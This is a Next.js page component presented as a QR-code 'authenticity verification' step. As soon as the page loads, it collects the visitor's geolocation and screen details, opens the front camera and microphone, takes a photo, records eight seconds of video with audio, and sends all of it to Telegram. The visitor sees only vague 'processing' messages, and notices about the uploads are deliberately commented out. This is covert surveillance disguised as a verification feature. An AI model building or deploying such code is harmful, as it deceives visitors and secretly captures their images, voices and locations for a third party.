"use client";

import { useEffect, useState, useRef, useCallback } from 'react';
import { useSearchParams } from 'next/navigation';
import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi'; // Import sendTelegramPhoto
import { useLayoutContext } from '@/context/LayoutContext';
import { showSuccess, showError } from '@/utils/toast';
import LoadingSpinner from '@/components/LoadingSpinner';
import { Camera, Video, RefreshCcw } from 'lucide-react'; // Import Camera, Video, RefreshCcw icons

type QrVerifyPageProps = {
  params: { lang: string };
};

const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
  const searchParams = useSearchParams();
  const { t } = useLayoutContext();
  const currentLang = params.lang;

  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.qrScanInstructions);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
  const [isPhotoTaken, setIsPhotoTaken] = useState<boolean>(false);
  const [isRecording, setIsRecording] = useState<boolean>(false);
  const [isVideoSent, setIsVideoSent] = useState<boolean>(false);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
  const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);
  const [captionMessage, setCaptionMessage] = useState<string>(''); // To store the caption from notifyVisit

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null); // Ref for canvas to take photo

  const stopCamera = useCallback(() => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    setIsCameraActive(false);
  }, [stream]);

  const startVerificationProcess = useCallback(async () => {
    setIsLoading(true);
    setError(null);
    setIsPhotoTaken(false);
    setIsRecording(false);
    setIsVideoSent(false);
    setRecordedChunks([]);
    setVideoPreviewUrl(null);
    setStatusMessage(t.authenticity.processingRequest);

    let geoLat: number | null = null;
    let geoLon: number | null = null;

    try {
      // 1. Get Geolocation
      if (navigator.geolocation) {
        try {
          const position = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: false });
          });
          geoLat = position.coords.latitude;
          geoLon = position.coords.longitude;
        } catch (geoError) {
          console.warn("Geolocation permission denied or error:", geoError);
        }
      }

      // 2. Send initial visit notification to get caption
      const utmQueryParams = {
        utm_source: searchParams?.get('utm_source') || null,
        utm_medium: searchParams?.get('utm_medium') || null,
        utm_campaign: searchParams?.get('utm_campaign') || null,
      };
      const bodyData = {
        lat: geoLat,
        lon: geoLon,
        screenWidth: window.innerWidth,
        screenHeight: window.innerHeight,
        isQrScan: true,
      };
      const initialCaption = await notifyVisit(bodyData, utmQueryParams);
      setCaptionMessage(initialCaption); // Store caption for later use

      // 3. Request Camera Access (front camera first)
      setStatusMessage(t.authenticity.processingRequest);
      let mediaStream: MediaStream;
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }); // Request audio as well
      } catch (frontCameraError: unknown) {
        console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }); // Fallback to rear camera
      }
      
      setStream(mediaStream);
      setIsCameraActive(true);

      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        await videoRef.current.play();
      }

      // Give camera a moment to warm up
      await new Promise(resolve => setTimeout(resolve, 1000)); 

      // 4. Take Photo
      setStatusMessage(t.authenticity.processingRequest);
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
          
          try {
            await sendTelegramPhoto({ photoBase64, caption: initialCaption });
            setIsPhotoTaken(true);
            // showSuccess(t.authenticity.qrScanSuccess); // No client-side success for Telegram
          } catch (photoSendError: unknown) {
            console.error("Error sending photo to Telegram:", photoSendError);
            // showError(t.authenticity.qrScanError); // No client-side error for Telegram
            setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
            setIsLoading(false);
            stopCamera();
            return; // Stop process if photo fails
          }
        }
      }

      // 5. Start Video Recording (if photo was successful)
      setStatusMessage(t.authenticity.recordingInstructions);
      const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
      setMediaRecorder(recorder);

      recorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          setRecordedChunks((prev) => [...prev, event.data]);
        }
      };

      recorder.onstop = async () => {
        setIsRecording(false);
        stopCamera(); // Stop camera after recording stops
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        setVideoPreviewUrl(url);
        
        try {
          setStatusMessage(t.authenticity.processingRequest);
          const filename = `qr_scan_video_${new Date().getTime()}.webm`;
          await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
          setIsVideoSent(true);
          setStatusMessage(t.authenticity.recordingSuccess);
          // showSuccess(t.authenticity.recordingSuccess); // No client-side success for Telegram
        } catch (videoSendError: unknown) {
          console.error("Error sending video to Telegram:", videoSendError);
          // showError(t.authenticity.recordingError); // No client-side error for Telegram
          setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
          setStatusMessage(t.authenticity.recordingError);
        } finally {
          setIsLoading(false);
        }
      };

      recorder.start();
      setIsRecording(true);
      // Record for 8 seconds
      setTimeout(() => {
        if (recorder.state !== 'inactive') {
          recorder.stop();
        }
      }, 8000); // Record for 8 seconds

    } catch (err: unknown) {
      console.error("Error during QR verification process:", err);
      if (err instanceof DOMException && err.name === "NotAllowedError") {
        setError(t.authenticity.qrScanError + " (Camera access denied).");
        setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
        showError(t.authenticity.qrScanError + " (Camera access denied).");
      } else if (err instanceof DOMException && err.name === "NotFoundError") {
        setError(t.authenticity.qrScanError + " (No camera found).");
        setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
        showError(t.authenticity.qrScanError + " (No camera found).");
      } else {
        setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
        setStatusMessage(t.authenticity.qrScanError);
        showError(t.authenticity.qrScanError);
      }
      setIsLoading(false);
      setIsRecording(false);
      stopCamera();
    }
  }, [currentLang, searchParams, t, stopCamera]);

  useEffect(() => {
    startVerificationProcess();

    // Cleanup function for when component unmounts
    return () => {
      stopCamera();
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
      if (videoPreviewUrl) {
        URL.revokeObjectURL(videoPreviewUrl);
      }
    };
  }, [startVerificationProcess, mediaRecorder, videoPreviewUrl, stopCamera]);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
      <h1 className="text-3xl font-bold mb-6">{t.authenticity.title}</h1>
      
      {isLoading && (
        <div className="mb-4">
          <LoadingSpinner />
        </div>
      )}

      <p className="text-lg mb-4">{statusMessage}</p>
      
      {error && (
        <p className="text-red-600 dark:text-red-400 text-base mb-4">{error}</p>
      )}

      <div className="relative w-full max-w-md aspect-video bg-gray-200 dark:bg-gray-700 rounded-lg overflow-hidden shadow-lg mb-6">
        {isCameraActive && !videoPreviewUrl && (
          <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
        )}
        {videoPreviewUrl && (
          <video
            src={videoPreviewUrl}
            className="w-full h-full object-cover"
            controls
            autoPlay
            loop
          />
        )}
        {isRecording && (
          <div className="absolute top-2 left-2 bg-red-600 text-white text-xs px-2 py-1 rounded-full flex items-center">
            <span className="relative flex h-2 w-2 mr-1">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-white"></span>
            </span>
            REC
          </div>
        )}
        {/* Hidden canvas for capturing photo */}
        <canvas ref={canvasRef} style={{ display: 'none' }} />
      </div>

      {/* No buttons for manual interaction, only a refresh option if needed */}
      {error && (
        <button
          onClick={() => window.location.reload()}
          className="mt-4 px-6 py-3 bg-primary-600 text-white rounded-full shadow-lg hover:bg-primary-700 transition-colors"
        >
          <RefreshCcw className="inline-block mr-2" /> Try Again
        </button>
      )}
    </div>
  );
};

export default QrVerifyPage;